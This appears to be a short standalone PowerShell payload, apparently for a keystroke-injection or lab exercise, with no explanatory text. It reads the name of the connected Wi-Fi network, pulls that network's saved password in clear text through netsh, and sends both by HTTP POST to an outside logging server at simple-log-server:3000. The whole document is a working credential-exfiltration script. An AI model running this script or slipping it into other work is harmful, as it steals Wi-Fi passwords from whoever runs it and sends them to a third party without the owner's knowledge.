$_, $ssid = ((netsh wlan show interface | findstr "Profile" | findstr /v "mode") -split ":",2).trim()
$_, $pass = ((netsh wlan show profile name=$ssid key=clear | findstr Key) -split ":").trim()
$postParams = @{data="$($ssid) : $($pass)"}
Invoke-WebRequest -Uri http://simple-log-server:3000/email -Method POST -Body $postParams